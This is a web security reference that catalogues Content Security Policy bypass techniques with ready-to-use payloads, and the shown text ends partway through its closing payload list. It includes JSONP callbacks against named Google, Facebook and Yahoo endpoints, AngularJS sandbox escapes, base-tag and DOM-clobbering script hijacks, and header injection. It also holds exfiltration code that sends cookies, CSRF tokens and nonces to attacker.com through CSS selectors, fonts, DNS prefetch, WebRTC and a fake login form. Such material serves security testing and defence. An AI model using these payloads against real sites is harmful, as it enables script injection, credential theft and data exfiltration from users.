# 13 - Advanced CSP Bypass Techniques

## Overview

Even well-designed Content Security Policies can be bypassed when specific conditions are met. This document catalogs advanced CSP bypass techniques organized by category, with ready-to-use payloads for each. These techniques assume the attacker has an HTML injection point but is blocked from direct script execution by CSP. Understanding these methods is critical for testing whether a CSP truly prevents exploitation of an XSS vulnerability.

**Sources:**
- https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses
- https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

---

## 1. JSONP-Based Bypass

### How It Works

JSONP (JSON with Padding) endpoints accept a `callback` parameter and return the response wrapped in a function call. When a CSP-whitelisted domain hosts a JSONP endpoint, the attacker can inject arbitrary JavaScript via the callback parameter. The browser executes it because the script source is on a trusted domain.

**Attack flow:**
1. CSP allows `script-src https://trusted-domain.com`
2. `https://trusted-domain.com/api?callback=USER_INPUT` returns `USER_INPUT({"data":"value"})`
3. Attacker injects: `<script src="https://trusted-domain.com/api?callback=alert(document.domain)//">`
4. Response becomes: `alert(document.domain)//({...})` -- valid JavaScript that executes

### Conditions Required
- `script-src` whitelists a domain that hosts JSONP endpoints
- The JSONP endpoint reflects the callback parameter without sufficient sanitization
- The response `Content-Type` is `text/javascript`, `application/javascript`, or browser treats it as script

### Known JSONP Endpoints on Major Domains

**Google (*.google.com, *.googleapis.com)**
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://www.google.com/complete/search?client=chrome&q=xss&callback=alert(1)//"></script>
<script src="https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=test&callback=alert(1)"></script>
<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
<script src="https://www.google.com/jsapi?callback=alert(1)"></script>
```

**Facebook (*.facebook.com)**
```html
<script src="https://www.facebook.com/ajax/haste-response?__a=1&__user=0&jsonp=alert(1)"></script>
<script src="https://www.facebook.com/plugins/like.php?callback=alert(1)"></script>
```

**Yahoo**
```html
<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?output=jsonp&callback=alert(1)"></script>
```

**Other Common Services**
```html
<!-- Subdomain-specific JSONP on target's own API -->
<script src="https://api.target.com/v1/data?callback=alert(document.domain)//"></script>

<!-- Common CDN-hosted JSONP patterns -->
<script src="https://whitelisted.com/jsonp?cb=alert(1)//"></script>
<script src="https://whitelisted.com/api?jsonpcallback=alert(1)//"></script>
```

### Methodology: Finding JSONP Endpoints

1. **Extract all whitelisted domains** from the CSP `script-src` directive
2. **Check the JSONBee database**: https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt
3. **Use CSPBypass tool**: https://github.com/renniepak/CSPBypass -- automated discovery of bypass-able endpoints on whitelisted domains
4. **Use JSONPeek**: https://www.blackhillsinfosec.com/jsonpeek-and-csp-b-gone/ -- scans pages for JSONP endpoints
5. **Google dork each whitelisted domain**: `site:whitelisted-domain.com inurl:callback OR inurl:jsonp OR inurl:cb`
6. **Fuzz common JSONP parameter names**: `callback`, `cb`, `jsonp`, `jsonpcallback`, `jcb`, `call`, `_callback`, `handler`, `func`
7. **Test callback character filtering**: Try `alert(1)`, `alert(1)//`, `alert%281%29`, `eval(name)`, parenthesis-less payloads

**Source:** https://www.blackhillsinfosec.com/jsonpeek-and-csp-b-gone/
**Source:** https://github.com/zigoo0/JSONBee
**Source:** https://hurricanelabs.com/blog/bypassing-csp-with-jsonp-endpoints/

---

## 2. CDN/Library-Based Bypass

### AngularJS Bypass

AngularJS (especially versions before 1.6, but later versions contain gadgets too) provides template expression evaluation that allows code execution. When AngularJS is loaded from a CSP-whitelisted CDN, the execution occurs within the Angular framework -- not via an inline script -- so CSP does not block it.

**Condition:** `script-src` allows a CDN hosting AngularJS (e.g., `cdnjs.cloudflare.com`, `ajax.googleapis.com`, `*.gstatic.com`, `unpkg.com`)

**Classic AngularJS CSP Bypass (56 characters for the Angular-specific part):**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

**AngularJS ng-focus + orderBy Bypass (works in CSP mode):**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>
  <input id=x ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>
  <input id=y autofocus onfocus=x.focus()>
</div>
```
This technique uses AngularJS's `$event` object. On Chrome, `$event.composedPath()` returns an array where the last element is the `window` object. The `orderBy` filter enumerates this array, and `[].constructor.from([1],alert)` calls `alert` with `1`.

**AngularJS $event.view Bypass:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(document.domain)">click me</div>
</div>
```

**AngularJS sandbox escape + CSP bypass (versions < 1.6):**
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
<div ng-app ng-csp>
  {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)')}}
</div>
```

**Source:** https://portswigger.net/research/angularjs-csp-bypass-in-56-characters
**Source:** https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp

### RequireJS / AMD Loader Bypass

RequireJS can dynamically load modules from arbitrary URLs via its `data-main` attribute. If `cdnjs.cloudflare.com` or another CDN hosting RequireJS is whitelisted:

```html
<script data-main="https://attacker.com/evil" src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>
```

RequireJS reads the `data-main` attribute and loads the specified URL as a module. Since RequireJS itself is loaded from a whitelisted source, and `strict-dynamic` trusts dynamically created scripts from trusted scripts, the attacker's module executes.

**Source:** https://acmccs.github.io/papers/p1709-lekiesA.pdf

### Prototype.js / MooTools / Other Library Gadgets

Some older JavaScript libraries provide execution gadgets:

**Prototype.js:** Provides `$$()` CSS selector and `.evalScripts()` method that can be chained:
```javascript
// If Prototype.js is loaded and attacker controls HTML
$$('.user-content')[0].innerHTML = '<script>alert(1)<\/script>';
$$('.user-content')[0].evalScripts();
```

**Knockout.js:** Data binding can execute arbitrary expressions:
```html
<div data-bind="html: '<img src=x onerror=alert(1)>'"></div>
```

**Vue.js (v2 template compilation):** If Vue.js is loaded and template compilation is enabled:
```html
<div id="app">{{constructor.constructor('alert(1)')()}}</div>
<script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
<script nonce="valid">new Vue({el:'#app'})</script>
```

### Exploiting `strict-dynamic` with Library Gadgets

The key academic finding from "Breaking Cross-Site Scripting Mitigations via Script Gadgets" (Lekies et al., ACM CCS 2017) demonstrated that most analyzed JavaScript frameworks contain gadgets capable of creating and inserting `<script>` elements with controlled `src` or body attributes. When `strict-dynamic` is active, these dynamically created scripts are trusted.

**Frameworks with known gadgets for strict-dynamic bypass:**
- AngularJS (template expressions create executable code)
- Polymer 1.x (data binding can create script elements)
- RequireJS (data-main attribute loads external modules)
- Aurelia (innerHTML binding enables script injection)
- Dojo Toolkit (module loading from URLs)

**Source:** https://acmccs.github.io/papers/p1709-lekiesA.pdf

### Relative Path Overwrite (RPO) for CDN Bypass

If CSP allows a CDN path like `https://cdn.example.com/scripts/react/`, path traversal may load different libraries from the same CDN:

```html
<script src="https://cdn.example.com/scripts/react/../angular.js/1.4.6/angular.min.js"></script>
```

The browser resolves `../` and loads `https://cdn.example.com/scripts/angular.js/1.4.6/angular.min.js`. Some servers (especially reverse proxies, nginx, Apache) handle path traversal differently from the browser, creating path confusion opportunities.

---

## 3. Base Tag Redirect for Relative Scripts

### How It Works

If a page loads scripts using relative paths (e.g., `<script src="/js/app.js">`) and the CSP does NOT include the `base-uri` directive, an attacker can inject a `<base>` tag to redirect all relative URL resolution to an attacker-controlled server.

### Basic Base Tag Hijack

```html
<!-- Attacker injects this BEFORE the page's script tags -->
<base href="https://attacker.com/">
```

Now the page's existing `<script src="/js/app.js">` resolves to `https://attacker.com/js/app.js`.

### Base Tag + Nonce Exploitation

This is especially devastating with nonce-based CSP. If the legitimate script tag already has a valid nonce:

```html
<!-- Original page has: -->
<script nonce="abc123" src="/js/app.js"></script>

<!-- Attacker injects BEFORE the script tag: -->
<base href="https://attacker.com/">

<!-- Result: Browser loads https://attacker.com/js/app.js with valid nonce abc123 -->
```

The nonce validates the `<script>` element, and the `src` is resolved using the injected base URL. The attacker serves malicious JavaScript from their server.

### Base Tag + strict-dynamic Chain

With `strict-dynamic`, the attacker's script loaded via base tag hijack is trusted. Any scripts it dynamically creates are also trusted, enabling full exploitation:

```javascript
// attacker.com/js/app.js (attacker-controlled file served to match page's relative path)
var s = document.createElement('script');
s.textContent = 'alert(document.domain)';
document.body.appendChild(s);
// With strict-dynamic, this dynamically created script also executes
```

**Source:** https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
**Source:** https://sec.stealthcopter.com/intigriti-july-2024-ctf-challenge-memo/

---

## 4. Script Gadgets

### What Are Script Gadgets?

Script gadgets are existing legitimate JavaScript code fragments within trusted libraries or application scripts that can be repurposed by an attacker to achieve arbitrary code execution. Instead of injecting new JavaScript (which CSP blocks), the attacker injects HTML markup that triggers a gadget in already-trusted code. The trusted code then performs the dangerous operation on the attacker's behalf.

**Types of gadgets:**
1. **Element creation gadgets:** Trusted code creates `<script>` elements based on attacker-controlled DOM
2. **Eval gadgets:** Trusted code passes attacker-controlled strings to `eval()` or `Function()`
3. **innerHTML gadgets:** Trusted code sets `innerHTML` from attacker-influenced data
4. **URL loading gadgets:** Trusted code loads scripts from URLs derived from DOM elements

### DOM Clobbering for Gadget Creation

DOM clobbering is an HTML-only attack technique (no JavaScript needed) that overrides JavaScript variables via named HTML elements. Elements with `id` or `name` attributes become properties of `document` and `window`.

**Target code pattern:**
```javascript
// Trusted application code (has valid nonce or is loaded from allowed src)
var config = window.appConfig || {scriptUrl: '/js/default.js'};
var s = document.createElement('script');
s.src = config.scriptUrl;
document.body.appendChild(s);
```

**DOM Clobbering attack:**
```html
<!-- Inject before the trusted script runs -->
<a id="appConfig" href="https://attacker.com/evil.js"></a>
```

Now `window.appConfig` returns the anchor element. For deeper property access:

```html
<!-- Nested clobbering for property access (e.g., config.scriptUrl) -->
<form id="appConfig"><input name="scriptUrl" value="https://attacker.com/evil.js"></form>
```

`window.appConfig.scriptUrl` is now clobbered to the input's `value`, and the trusted script loads the attacker's file.

**Advanced DOM clobbering with HTMLCollection:**
```html
<!-- Clobber with multiple elements sharing the same id -->
<a id="config"></a>
<a id="config" name="url" href="https://attacker.com/evil.js"></a>
```

`document.getElementById('config')` returns the first element, but `window.config` may create an HTMLCollection. Different code patterns interact with this differently.

**Source:** https://portswigger.net/research/bypassing-csp-via-dom-clobbering
**Source:** https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/

### Known Library Gadgets -- Comprehensive List

| Library | Gadget Type | Exploitation Mechanism |
|---------|-------------|----------------------|
| AngularJS 1.x | Template expression eval | `{{constructor.constructor('alert(1)')()}}` |
| Angular (2+) | Template injection (rare) | `[innerHTML]="payload"` if unsanitized |
| Vue.js 2.x | Template compilation | `{{constructor.constructor('alert(1)')()}}` |
| Polymer 1.x | Data binding | Two-way binding writes to DOM, creates script elements |
| Aurelia | innerHTML binding | Custom element with `innerHTML.bind="attackerData"` |
| jQuery (< 3.0) | `.html()` method | Event handlers in injected HTML execute |
| jQuery Mobile | Page initialization | `data-url` attribute injection triggers script loading |
| Knockout.js | Data binding | `data-bind="html: attackerInput"` executes injected scripts |
| Ember.js | Template helpers | `{{{unescapedUserInput}}}` triple-brace syntax |
| Mithril.js | m.trust() | Trusted HTML insertion bypasses sanitization |
| Dojo Toolkit | Module loading | `dojo.require()` from attacker-controlled source |
| RequireJS | data-main attribute | Loads modules from URLs specified in DOM attributes |
| Prototype.js | evalScripts() | Evaluates `<script>` tags in dynamically inserted HTML |
| Backbone.js | View rendering | `this.$el.html(userInput)` without sanitization |

**Source:** https://acmccs.github.io/papers/p1709-lekiesA.pdf

### Chaining Gadgets

Multiple gadgets can be chained for complex attacks:

1. **DOM Clobber -> Script Load:** Clobber a config variable to point to attacker's script URL
2. **Base Tag -> Library Gadget:** Redirect relative paths, then use library gadget for execution
3. **CSS Injection -> Nonce Leak -> Script Injection:** Leak nonce via CSS, then inject nonced script
4. **DOM Clobber -> eval Gadget:** Clobber a variable that trusted code passes to `eval()`

---

## 5. Policy Injection Techniques

### CSP Header Injection via Response Splitting

If the application reflects user input into HTTP response headers (e.g., language parameter, cookie value):

```
GET /page?lang=en%0d%0aContent-Security-Policy:%20script-src%20*%20'unsafe-inline' HTTP/1.1
```

On vulnerable servers (older PHP, misconfigured proxies), this CRLF injection (`%0d%0a`) inserts a new header. However, because multiple `Content-Security-Policy` headers create an intersection (most restrictive wins), this only helps if:
- No CSP header exists yet (attacker sets a permissive one)
- The attacker can replace or suppress the original header via response splitting

### Duplicate CSP Headers -- Intersection Behavior

```
Content-Security-Policy: script-src https://a.com
Content-Security-Policy: script-src https://b.com
```

Effective policy: a script must satisfy BOTH policies. Only scripts from domains appearing in both allowlists execute. This generally means an attacker-injected second CSP header makes things stricter, not more permissive.

**Exception:** Some older browsers or CDN/proxy configurations may handle multiple headers inconsistently, taking only the first or the last header.

### CSP Injection via Reflected Parameter in Policy

Some applications dynamically construct CSP headers using request parameters:

```
GET /page?nonce=abc123
Response: Content-Security-Policy: script-src 'nonce-abc123'
```

If the application reflects a parameter directly into the CSP header value, an attacker can inject additional directives:

```
GET /page?nonce=abc123'%3Bscript-src-elem%20'unsafe-inline'%3B
Response: Content-Security-Policy: script-src 'nonce-abc123';script-src-elem 'unsafe-inline';
```

The injected `script-src-elem 'unsafe-inline'` directive overrides `script-src` for `<script>` elements specifically (CSP Level 3 fallback chain: `script-src-elem` is checked before `script-src`).

**Source:** https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

### Meta Tag CSP Injection

If an attacker can inject HTML that includes a `<meta>` tag, but a CSP header already exists:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
```

The browser applies the **intersection** of the header CSP and meta tag CSP. Injecting a permissive meta tag does NOT weaken an existing strict header CSP.

However, if there is NO header CSP, the meta tag takes full effect. If the attacker injects a meta tag BEFORE the page's own meta CSP tag, some browsers evaluate both as intersection, but the attacker's injection point matters.

**Source:** https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

---

## 6. Nonce and Hash Bypass Techniques

### 6.1. Nonce Reuse (Static/Predictable Nonces)

Some applications use static or predictable nonces instead of cryptographically random per-request values:

```
Content-Security-Policy: script-src 'nonce-STATIC_VALUE_123'
```

**Testing methodology:**
1. Make 5+ requests to the same page
2. Extract the nonce value from each response
3. If the nonce is identical or follows a pattern, it is exploitable

**Bypass payload:**
```html
<script nonce="STATIC_VALUE_123">alert(document.domain)</script>
```

**Common static nonce causes:**
- Full-page caching by a CDN (returns cached CSP header with old nonce)
- Server-side template caching that includes the nonce
- Load balancer caching responses
- Developer using hardcoded nonce during development that persisted to production

### 6.2. Nonce Leaking via CSS Attribute Selectors

When the nonce is exposed in the DOM (e.g., in a `<meta>` tag or as an attribute on an element), CSS attribute selectors can exfiltrate it character by character.

**Target:** `<script nonce="a8f3e2b1c9d4">...</script>` or `<meta content="script-src 'nonce-a8f3e2b1c9d4'">`

**CSS exfiltration payload (requires `style-src 'unsafe-inline'` or attacker-controlled CSS):**
```css
/* Leak first character */
script[nonce^="a"] { background: url('https://attacker.com/leak?n=a'); }
script[nonce^="b"] { background: url('https://attacker.com/leak?n=b'); }
/* ... all base64 characters: a-z, A-Z, 0-9, +, / ... */

/* After learning first char is 'a', leak second character */
script[nonce^="a0"] { background: url('https://attacker.com/leak?n=a0'); }
script[nonce^="a1"] { background: url('https://attacker.com/leak?n=a1'); }
/* ... continue iteratively for each position ... */
```

The attacker's server logs HTTP requests to reconstruct the nonce. This requires multiple page loads (one per character) or a very large CSS payload probing all combinations in one shot.

**Browser mitigation:** Chrome and Edge remove the `nonce` attribute from the DOM after parsing, making direct CSS selector matching fail for `<script>` nonce attributes. However, nonces in `<meta>` tag `content` attributes are NOT hidden.

**Source:** https://csplite.com/csp304/

### 6.3. Nonce Stealing via Dangling Markup Injection

If an attacker can inject an unclosed HTML attribute before a nonced script tag, the browser may consume subsequent markup -- including the nonce value -- as part of the attribute value:

```html
<!-- Attacker injects (note unclosed src attribute): -->
<img src="https://attacker.com/collect?data=
<!-- Everything after this is consumed as part of the URL... -->
<div class="content">
  <script nonce="a8f3e2b1c9d4">
    // legitimate code
  </script>
```

The browser interprets all text after `src="` until a matching `"` as the URL. If the nonce appears in the consumed markup, it is sent to the attacker's server as part of the image request URL.

**Limitations:**
- Modern browsers increasingly restrict dangling markup (Chrome blocks certain characters in URLs from dangling markup)
- The consumed HTML must not contain a `"` character before the nonce value
- The CSP spec addresses nonce exfiltration via dangling markup

**Source:** https://github.com/w3c/webappsec-csp/issues/98
**Source:** https://github.com/w3c/webappsec-csp/issues/258

### 6.4. Nonce Stealing via Base Tag

If `base-uri` is unrestricted, an attacker can combine base tag injection with HTML imports or relative resource loads to exfiltrate page content including nonces:

```html
<base href="https://attacker.com/">
<!-- If the page has relative imports or fetch calls, those go to attacker.com -->
<!-- The request includes the page context which may contain nonce values -->
```

### 6.5. Nonce via Browser Cache Exploitation (bfcache / Disk Cache)

A sophisticated technique exploiting browser caching mechanisms:

1. **First visit:** CSS injection leaks the nonce from a `<meta>` tag or DOM attribute
2. **Nonce is cached** by browser's back/forward cache (bfcache) or disk cache
3. **Attacker navigates user** away from the page, then uses `history.back()` or similar
4. **bfcache restores** the page with the same nonce value from the cached response
5. **Attacker's injected payload** uses the known cached nonce for script execution

**Conditions required:**
- The nonce must not change on bfcache restoration (some frameworks regenerate, some do not)
- The XSS payload must be persistent or reflected in a cached response
- The cache restoration must use the same nonce as the one leaked

**Source:** https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache

---

## 7. Strict-Dynamic Bypass Techniques

### How strict-dynamic Works

`'strict-dynamic'` tells the browser: "Trust any script dynamically created by an already-trusted (nonced or hashed) script." This allows legitimate dynamic script loading patterns while blocking attacker-injected inline scripts.

When `'strict-dynamic'` is active:
- `'unsafe-inline'` is ignored (backward compat with CSP2 browsers)
- Host-based allowlists (`https://cdn.example.com`) are ignored
- `'self'` is ignored
- Only `nonce-*` and `hash-*` source expressions control initial script trust
- Scripts created by trusted scripts inherit trust automatically

### Bypass via Trusted Script DOM Interaction

If a trusted nonced script reads from the DOM and creates new scripts based on that data, an attacker can inject DOM elements to control what the trusted script loads:

**Vulnerable trusted script pattern:**
```javascript
// This script has a valid nonce
var configEl = document.getElementById('app-config');
if (configEl) {
  var s = document.createElement('script');
  s.src = configEl.getAttribute('data-script-url');
  document.body.appendChild(s);  // strict-dynamic allows this
}
```

**Attack injection:**
```html
<div id="app-config" data-script-url="https://attacker.com/evil.js"></div>
```

The trusted script reads the attacker's DOM element and creates a new script pointing to `attacker.com`. Since `strict-dynamic` trusts scripts created by nonced scripts, `evil.js` executes.

### Bypass via Parser-Inserted Script from Trusted Origin

If the page uses `document.write()` in a trusted script:

```javascript
// Trusted nonced script
document.write('<script src="' + someVariable + '"><\/script>');
```

If `someVariable` is attacker-controlled (via DOM clobbering or URL parameter reflection), the attacker controls the loaded script URL.

### Bypass via Open Redirect on Whitelisted Domain

With `strict-dynamic`, host allowlists are ignored, but if a nonced script loads a resource from a domain that has an open redirect:

```html
<script nonce="valid" src="https://trusted.com/redirect?url=https://attacker.com/evil.js"></script>
```

In some browser implementations, the browser validates the initial `<script>` element (nonce is valid), but follows the redirect during resource fetch, ultimately loading attacker-controlled code.

### Bypass via Webpack/Module Loader DOM Clobbering

Webpack's `AutoPublicPathRuntimeModule` was found vulnerable to DOM clobbering. An attacker could clobber the public path variable, causing Webpack's chunk loading to fetch from an attacker-controlled origin. This bypasses strict-dynamic because Webpack's chunk loader is a trusted script.

**Source:** https://bugzilla.mozilla.org/show_bug.cgi?id=1316826
**Source:** https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks

---

## 8. Navigation and Exfiltration Bypasses

These techniques focus on exfiltrating sensitive data even when CSP completely prevents script execution.

### 8.1. Form Action Hijacking

`form-action` does NOT fall back to `default-src`. If it is absent from the CSP, forms can submit to any origin:

**Credential theft via injected form:**
```html
<form action="https://attacker.com/collect" method="POST">
  <h2>Session Expired - Please Login Again</h2>
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="Login">
</form>
```

**Override existing form target via formaction attribute:**
```html
<button form="legitimate-form-id" formaction="https://attacker.com/steal" formmethod="POST" type="submit">
  Submit
</button>
```

**Source:** https://portswigger.net/research/using-form-hijacking-to-bypass-csp
**Source:** https://labs.detectify.com/ethical-hacking/content-security-policy-csp-bypassing-form-action-with-reflected-xss/

### 8.2. Meta Refresh Redirect

The `<meta http-equiv="refresh">` tag is NOT controlled by most CSP directives. The experimental `navigate-to` directive aims to address this but has no mainstream browser support:

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?cookie=SENSITIVE_DATA">
```

Can be combined with server-side token reflection:
```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?token={{csrf_token}}">
```

### 8.3. DNS Prefetch Exfiltration

CSP does NOT control DNS resolution. Data can be encoded as subdomains and exfiltrated via DNS queries:

```html
<link rel="dns-prefetch" href="//sensitive-token-value.attacker.com">
<link rel="dns-prefetch" href="//csrf-abc123def456.attacker.com">
<link rel="dns-prefetch" href="//session-id-here.attacker.com">
```

The attacker monitors DNS queries on their authoritative nameserver to reconstruct the exfiltrated data. Works even with the strictest CSP policies.

**Limitations:**
- DNS labels limited to 63 characters, total domain to 253 characters
- Only alphanumeric characters and hyphens in DNS labels (data must be hex/base32 encoded)
- Some browsers honor `X-DNS-Prefetch-Control: off` header
- Browser prefetching behavior varies

**Source:** https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/

### 8.4. Link Prefetch / Preconnect Exfiltration

```html
<link rel="prefetch" href="https://attacker.com/collect?data=SECRET_TOKEN">
<link rel="preconnect" href="https://attacker.com">
<link rel="prerender" href="https://attacker.com/collect?data=SECRET_TOKEN">
```

Depending on browser and CSP configuration, `prefetch-src` (deprecated) or `default-src` may control `<link rel="prefetch">`, but coverage is inconsistent across browsers. In many cases, these bypass `connect-src` restrictions.

### 8.5. WebRTC Data Exfiltration

WebRTC is NOT controlled by `connect-src` or any other CSP directive. If an attacker achieves even limited JavaScript execution (e.g., via a script gadget), WebRTC provides an unrestricted exfiltration channel:

```javascript
// WebRTC exfiltration -- NOT blocked by any CSP directive
var pc = new RTCPeerConnection({
  iceServers: [{
    urls: "turn:attacker.com?data=" + encodeURIComponent(document.cookie),
    username: "x",
    credential: "x"
  }]
});
pc.createDataChannel('exfil');
pc.createOffer().then(o => pc.setLocalDescription(o));
```

The TURN server request to `attacker.com` carries the exfiltrated data. A CSP `webrtc` directive has been proposed in the spec but is not implemented in any browser.

**Source:** https://github.com/w3c/webappsec-csp/issues/92

### 8.6. Anchor Click Navigation

If `navigate-to` is not set (which is the case for virtually all deployments):

```html
<a href="https://attacker.com/collect?data=TOKEN" id="x">Important Security Update</a>
```

With user interaction (social engineering) or combined with limited JS execution (`window.location` redirect), this exfiltrates data via navigation.

---

## 9. CSS-Based Data Exfiltration

When `style-src` allows `'unsafe-inline'` or an attacker can inject CSS through other means (e.g., style injection via HTML attributes), data can be exfiltrated without any JavaScript execution.

### 9.1. Attribute Value Exfiltration (CSRF Tokens, Secrets)

```css
/* Leak CSRF token from hidden input character by character */
input[name="csrf_token"][value^="a"] { background: url('https://attacker.com/leak?v=a'); }
input[name="csrf_token"][value^="b"] { background: url('https://attacker.com/leak?v=b'); }
/* ... all printable characters ... */
input[name="csrf_token"][value^="ab"] { background: url('https://attacker.com/leak?v=ab'); }
/* Continue iteratively for each character position */
```

Each matching CSS selector triggers a background image request to the attacker's server. The attacker reconstructs the token character by character from server logs.

### 9.2. Nonce Exfiltration from Meta Tag

```css
/* If nonce appears in meta tag content attribute */
meta[content*="nonce-a"] { --leak: url('https://attacker.com/?n=a'); }
meta[content*="nonce-b"] { --leak: url('https://attacker.com/?n=b'); }
/* ... continue for all base64 characters ... */
```

### 9.3. Font-Based Exfiltration (Content Character Detection)

```css
@font-face { font-family: probe_a; src: url('https://attacker.com/leak?char=a'); unicode-range: U+0061; }
@font-face { font-family: probe_b; src: url('https://attacker.com/leak?char=b'); unicode-range: U+0062; }
@font-face { font-family: probe_0; src: url('https://attacker.com/leak?char=0'); unicode-range: U+0030; }
.secret-content { font-family: probe_a, probe_b, probe_0, sans-serif; }
```

The browser only fetches fonts for unicode ranges that appear in the element's text content. This reveals which characters are present in the target element (but not their order or frequency).

### 9.4. @import for Multi-Stage CSS Exfiltration

```css
@import url('https://attacker.com/stage1.css');
```

The attacker's server dynamically generates CSS containing selectors targeted at the specific page, enabling a multi-round exfiltration protocol where each round leaks more characters.

---

## 10. Browser-Specific CSP Vulnerabilities

### CVE-2020-6519: Chrome CSP Bypass (CVSS 6.5)

Affected Chrome versions 73 through 83. The flaw allowed bypassing CSP by passing malicious JavaScript in the `src` property of an HTML iframe element. Websites like Facebook, Wells Fargo, Gmail, WhatsApp, TikTok, Instagram, Blogger, and Quora were susceptible.

Websites using nonce or hash-based CSP (like Twitter, GitHub, LinkedIn, PayPal) were NOT vulnerable.

**Source:** https://medium.com/perimeterx/zero-day-csp-bypass-vulnerability-in-google-chrome-discovered-almost-every-website-in-the-world-ac5e999808b3

### CVE-2024-7524: Firefox CSP Bypass

A vulnerability in Firefox and Firefox ESR allowed specific content handling to bypass CSP enforcement, enabling XSS on affected sites.

### CVE-2024-11694: Firefox Web Compatibility Shim CSP Bypass

Firefox Enhanced Tracking Protection's Strict mode contained a Google SafeFrame shim in the Web Compatibility extension that allowed `frame-src` bypass and DOM-based XSS.

### CVE-2019-17000: Firefox Object Tag CSP Bypass

An `<object>` tag with a `data:` URI did not correctly inherit the CSP of its parent document in cross-origin frame scenarios.

### CVE-2018-5175: Firefox strict-dynamic Universal Bypass

Firefox's internal `require.js` (used in `resource://` browser URLs) allowed a universal `strict-dynamic` bypass. A page could reference browser resource URLs containing require.js, which then loaded arbitrary scripts dynamically.

### Browser CSP Implementation Differences

| Feature | Chrome | Firefox | Safari | Edge |
|---------|--------|---------|--------|------|
| `strict-dynamic` | 52+ | 52+ | 15.4+ | 79+ |
| `unsafe-hashes` | 69+ | 68+ (partial) | No | 79+ |
| `script-src-elem` | 75+ | 105+ | No | 79+ |
| `navigate-to` | No | No | No | No |
| Nonce hiding from DOM | Yes (post-parse) | Partial | No | Yes |
| `worker-src` | 59+ | 58+ | 15.4+ | 79+ |
| Dangling markup protection | Yes (strict) | Partial | No | Yes |

---

## 11. Complete CSP Bypass Payload Reference (28 Payloads)

### Category A: JSONP Callback Injection
```html
<!-- A1: Google OAuth JSONP -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- A2: Google Autocomplete JSONP -->
<script src="https://www.google.com/complete/search?client=chrome&q=xss&callback=alert(1)//"></script>

<!-- A3: Google CSE JSONP -->
<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>

<!-- A4: Yahoo Search JSONP -->
<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?output=jsonp&callback=alert(1)"></script>

<!-- A5: Generic JSONP with comment termination -->
<script src="https://whitelisted.com/api?callback=alert(document.domain)//"></script>
```

### Category B: AngularJS / Library Gadgets
```html
<!-- B1: AngularJS classic CSP bypass -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- B2: AngularJS ng-focus with orderBy (no click required) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>
<input id=x ng-focus=$event.composedPath()|orderBy:'[].constructor.from([1],alert)'>
<input id=y autofocus onfocus=x.focus()>
</div>

<!-- B3: AngularJS $event.view bypass (click required) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp><div ng-click="$event.view.alert(document.domain)">click</div></div>

<!-- B4: RequireJS data-main external load -->
<script data-main="https://attacker.com/evil" src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>

<!-- B5: AngularJS sandbox escape (< 1.6) -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
<div ng-app ng-csp>{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}</div>
```

### Category C: Base Tag Hijacking
```html
<!-- C1: Simple base tag redirect for relative scripts -->
<base href="https://attacker.com/">

<!-- C2: Base tag to steal nonce-protected relative script loads -->
<base href="https://attacker.com/">
<!-- Page's <script nonce="valid" src="/js/app.js"> now loads from attacker.com -->
```

### Category D: Nonce/Hash Exploitation
```html
<!-- D1: Reuse static/cached nonce -->
<script nonce="KNOWN_STATIC_NONCE">alert(document.domain)</script>

<!-- D2: Dangling markup to steal nonce -->
<img src="https://attacker.com/collect?
<!-- unclosed src attribute consumes subsequent markup including nonce -->

<!-- D3: CSS-based nonce exfiltration (inject as style) -->
